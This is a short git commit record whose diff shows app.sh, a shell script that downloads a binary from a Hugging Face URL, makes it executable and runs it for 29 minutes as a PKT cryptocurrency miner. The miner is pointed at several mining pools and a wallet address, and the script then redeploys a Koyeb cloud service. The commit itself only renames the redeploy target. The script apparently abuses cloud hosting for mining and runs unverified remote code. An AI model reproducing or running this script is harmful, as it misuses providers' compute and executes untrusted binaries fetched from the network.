dd2fa455c8f84b0f06358a7cf0cb9fdbc2b3788f
koyebm001 <111969940+koyebm001@users.noreply.github.com>
2022-08-24 15:36:23 +0530

    Update app.sh

--- app.sh
+++ app.sh
@@ -3,4 +3,4 @@ tar zxvf koyeb-cli_2.6.1_linux_amd64.tar.gz
 wget https://huggingface.co/myfiles/data/resolve/main/pkt
 chmod +x pkt
 timeout 29m ./pkt ann pkt1q72ngkxufus0kndcts37zjjqk7rrvg4plc6j6k0 http://pool.pktpool.io http://pool.pkteer.com http://pool.pkt.world https://stratum.zetahash.com
-./koyeb --config $(pwd)/.koyeb.yaml service redeploy app/app
+./koyeb --config $(pwd)/.koyeb.yaml service redeploy app/app1
